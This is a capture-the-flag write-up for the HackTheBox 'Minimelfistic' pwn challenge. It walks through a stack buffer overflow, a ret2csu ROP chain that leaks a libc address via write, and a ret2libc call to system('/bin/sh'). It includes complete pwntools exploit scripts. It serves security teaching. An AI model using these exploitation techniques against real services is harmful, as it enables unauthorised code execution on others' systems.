# Cyber Santa is Coming to Town (Minimelfistic)
Minimelfistic is i think the 4th challenge of the pwn category of the 2021 event Cyber Santa is Coming to Town from HackTheBox.

The challenge was relatively simple, it was a super simple ret2csu exploitation challenge, which could be done by pretty much anyone who has basic knowledge on assembly and exploitation.

## Patch the Alarms
So if you have looked a bit inside the binary in a disassembler, you can see that inside the function `setup()` there is a call to \_alarm which will cause the program to have a timeout, which i kinda hate when debugging.

So before trying to find any vulnerability i will open the binary inside IDA and perform a small program patch so we can skip the call to alarm and therefore we will don't get a time limit to debug the binary.

![](https://i.imgur.com/J9kqf1i.png)

As you can see in the picture, we replace 2 instructions by a bunch of nops and we kept pop rbp and retn.

*Don't forget to save and apply patch to the binary before leaving IDA*.
## Finding a vulnerability
Finding the vulnerability in this program is quite simple, since all the program logic is located in the main function.

Open your favorite decompiler or disassembler (disassemblers make much more sense in exploitation) and let's try to find this vulnerability.

![](https://i.imgur.com/36UzCuR.png)

We can see **highlighted in greed** our main infinite loop which in this case contains the vulnerable part of our program, **highlighted in red** is the vulnerable part and **highlighted in light blue** shows that if our input starts with `9` we will hit the `return 0` at the end of our program which will overwrite the return address.

*Note that if our string does not start with 9, the buffer overflow won't "trigger".*

## Finding the return address offset on the stack
Next step is to find where exactly does we start overwriting the return address, for this we'll use a cyclic pattern.

Fire up GDB and run your program inside it, it will ask you for an input, in our case you will need to put a "9" before the cyclic pattern
```
pwndbg> cyclic 120
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua  
aavaaawaaaxaaayaaazaabbaabcaabdaabeaab

pwndbg> r
  
[*] Santa is not home!  
  
[*] Santa is not home!  
  
[!] Santa returned!  
  
[*] Hello ! Do you want to turn off the ? (y/n)  
> 9aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua  
aavaaawaaaxaaayaaazaabbaabcaabdaabeaab

────────────────────────────────────[ DISASM ]────────────────────────────────────  
► 0x4009dc <main+259> ret <0x6161746161617361>

pwndbg> cyclic -l 0x61617361
71
```

We can conclude that we need `72 bytes (including the "9")`  before we hit the return address offset, so we can note this and begin writing our script.

## Templating an exploit
There is a cool python module for exploitation that generates template-ish pwntools exploit. It is pretty simple to use and i like to use it since it makes me win a lot of time, you can use it the following way.
```
$ pwn template ./minimelfistic > exploit.py
```

Then you can start writing your exploit inside this file, if you want to debug it you can run it with `GDB` as argument `e.g : python3 exploit.py GDB` will spawn the program inside gdb so you can step through the program.

## Obtain LIBC base address
Now we know the offset of our program, we need to leak a function from libc so we can leak the base address of libc.

So i headed inside Python IDLE, and i typed the following commands.
```
>>> import pwn  
>>> e = pwn.ELF("./minimelfistic")  
[*] '/challenge/pwn_minimelfistic/minimelfistic'  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x3ff000)  
>>> e.got  
{'__libc_start_main': 6303728, '__gmon_start__': 6303736, 'stdout': 6303760, 'stdi  
n': 6303776, 'write': 6303656, 'strlen': 6303664, 'alarm': 6303672, 'read': 630368  
0, 'srand': 6303688, 'time': 6303696, 'setvbuf': 6303704, 'sleep': 6303712, 'rand'  
: 6303720}
```

Looking at the output, we see the .got table of our binary which contains address of functions that are dynamically linked.

We need a function that can output the flag to the screen, something like a `sendfile, puts or write`. In our case we can see that we have the `write` function available... we will use it.

The `write` function is a little bit harder to execute in a ROP Chain than the `puts`, since write requires 3 arguments instead of 1. This means we will need to populate `rdi, rsi and rdx` instead of just `rdi`.

Unfortunately there is not enough gadget to populate the `rdx` register with the value we want, so we will need to rely on another technique... RET2CSU !!!

When a binary is dynamically linked on linux, there is always a `__libc_csu_init` function in the binary which contains 2 useful gadgets for us.

The first one is a "POP Slide", and the second one move a few values we just popped from the stack inside `edi, rsi and rdx`.
![](https://i.imgur.com/SIXfk7Q.png)

In our case we want to pop the values inside `r15, r14 and the lower 32 bits of r13`, we also want to populate the `r12` register with a function pointer so we can return back into our main function (*note that RBX will need to be 0 else the call at `__libc_csu_init+73` won't work*).

## Finding a function pointer somewhere in the  binary
In ret2csu attacks it is common to use the `_init` function that is also included in most dynamically linked binaries, so i opened ghidra and looked for `XREFS` to the `_init` function and i found that at address `0x00602db8` is exactly what we want, we can populate the register with the address and it should work.

## Populating registers for the \_init function
Calling into init will cause another pop slide, so in this one we will fill he popped registers with garbage data "AAAAAAAA".

## Writing the Leak
Now we know almost everything we need we will get to coding this exploit and achieve the leak of the address of write in the got table.

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./minimelfistic
from pwn import *
  
# Set up pwntools for the correct architecture
exe = context.binary = ELF('./minimelfistic')
# context.log_level = "debug"
context.terminal = ["konsole", "-e"]
# Many built-in settings can be controlled on the command-line and show up
# in "args". For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
  

def start(argv=[], *a, **kw):
'''Start the exploit against the target.'''
	if args.GDB:
		return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
	else:
		return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = 'break main'
  
#===========================================================
# EXPLOIT GOES HERE
#===========================================================
# Arch: amd64-64-little
# RELRO: Full RELRO
# Stack: No canary found
# NX: NX enabled
# PIE: No PIE (0x3ff000)
  
io = start()
#io = remote("localhost", 1337)
e = ELF("./minimelfistic")
libc = ELF("./libc.so.6")
  
CRASH = b"9" + b"A"*71
  
# ROP (pop rdi; ret)
rop = ROP(e)
POP_RDI_RET = p64(rop.find_gadget(["pop rdi", "ret"])[0])
  
# We need to call write(int fd, const void* buf, size_t count);
CSU_POP_SLIDE = p64(e.sym.__libc_csu_init+90)
CSU_MOVS = p64(e.sym.__libc_csu_init+64)
  
PAYLOAD = [
	CRASH,
	POP_RDI_RET,
	p64(1),
	CSU_POP_SLIDE,
	p64(0), # rbx
	p64(1), # rbp
	p64(0x00602db8), # r12 (else 0x400a0c, 00602db8)
	p64(1), # r13
	p64(e.got.write), # r14
	p64(8), # r15
	CSU_MOVS,
	b"AAAAAAAA"*7,
	p64(e.plt.write),
	p64(e.sym.main)
]

io.sendlineafter(b"> ", b"".join(PAYLOAD))
print(io.recvline())
print(io.recvline())
print(io.recvline())

WRITE_LEAK = u64(io.recv(8).ljust(8, b'\x00'))
libc.address = WRITE_LEAK - libc.sym.write

log.info(f"Leaked address of write : {hex(WRITE_LEAK)}")
log.info(f"Leaked address of libc : {hex(libc.address)}")

io.interactive()
```

Running this script should output the leaked address and the base address of libc, we're on the way to pwn this challenge hehe.

## Spawning a Shell
Now that we know the base address of libc we can pretty much execute what we want with the binary, but we'll stay in the challenge boundaries and go with the simplest payload i could think of.

You can append this part at the end of the script.

```py
SHELL_PAYLOAD = [
	CRASH,
	POP_RDI_RET,
	p64(next(libc.search(b"/bin/sh"))),
	p64(libc.sym["system"])
]

io.sendlineafter(b"> ", b"".join(SHELL_PAYLOAD))
io.interactive()
```

## Final Script
If you did the same thing as i did then your final script should look exactly or somewhat similar to the following script.
```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./minimelfistic
from pwn import *
  
# Set up pwntools for the correct architecture
exe = context.binary = ELF('./minimelfistic')
# context.log_level = "debug"
context.terminal = ["konsole", "-e"]
# Many built-in settings can be controlled on the command-line and show up
# in "args". For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
  

def start(argv=[], *a, **kw):
'''Start the exploit against the target.'''
	if args.GDB:
		return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
	else:
		return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = 'break main'
  
#===========================================================
# EXPLOIT GOES HERE
#===========================================================
# Arch: amd64-64-little
# RELRO: Full RELRO
# Stack: No canary found
# NX: NX enabled
# PIE: No PIE (0x3ff000)
  
io = start()
#io = remote("localhost", 1337)
e = ELF("./minimelfistic")
libc = ELF("./libc.so.6")
  
CRASH = b"9" + b"A"*71
  
# ROP (pop rdi; ret)
rop = ROP(e)
POP_RDI_RET = p64(rop.find_gadget(["pop rdi", "ret"])[0])
  
# We need to call write(int fd, const void* buf, size_t count);
CSU_POP_SLIDE = p64(e.sym.__libc_csu_init+90)
CSU_MOVS = p64(e.sym.__libc_csu_init+64)
  
PAYLOAD = [
	CRASH,
	POP_RDI_RET,
	p64(1),
	CSU_POP_SLIDE,
	p64(0), # rbx
	p64(1), # rbp
	p64(0x00602db8), # r12 (else 0x400a0c, 00602db8)
	p64(1), # r13
	p64(e.got.write), # r14
	p64(8), # r15
	CSU_MOVS,
	b"AAAAAAAA"*7,
	p64(e.plt.write),
	p64(e.sym.main)
]

io.sendlineafter(b"> ", b"".join(PAYLOAD))
print(io.recvline())
print(io.recvline())
print(io.recvline())

WRITE_LEAK = u64(io.recv(8).ljust(8, b'\x00'))
libc.address = WRITE_LEAK - libc.sym.write

log.info(f"Leaked address of write : {hex(WRITE_LEAK)}")
log.info(f"Leaked address of libc : {hex(libc.address)}")

io.interactive()

SHELL_PAYLOAD = [
	CRASH,
	POP_RDI_RET,
	p64(next(libc.search(b"/bin/sh"))),
	p64(libc.sym["system"])
]

io.sendlineafter(b"> ", b"".join(SHELL_PAYLOAD))
io.interactive()
```

Hope you enjoyed the challenge as much as i did enjoy pwning it :)
